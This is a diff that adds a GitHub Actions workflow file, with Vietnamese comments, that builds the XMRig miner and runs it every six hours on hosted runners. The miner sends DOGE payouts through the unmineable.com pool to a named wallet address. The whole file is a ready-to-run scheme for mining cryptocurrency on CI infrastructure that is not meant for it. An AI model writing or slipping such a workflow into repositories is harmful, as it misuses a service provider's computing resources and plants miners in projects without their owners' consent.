@@ -1,0 +1,35 @@
+name: DOGE Miner via XMRig
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'  # chạy lại mỗi 6 giờ
+
+jobs:
+  mine-doge:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # tối đa 6 giờ/job
+
+    steps:
+      - name: Install Dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Clone & Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Run DOGE Mining
+        run: |
+          cd xmrig/build
+          ./xmrig \
+            -o rx.unmineable.com:3333 \
+            -a rx \
+            -k \
+            -u DOGE:DNkYdF4a66hAWM1tKKcGM5Y6BFwM8V65F4.AWM-S1 \
+            -p x
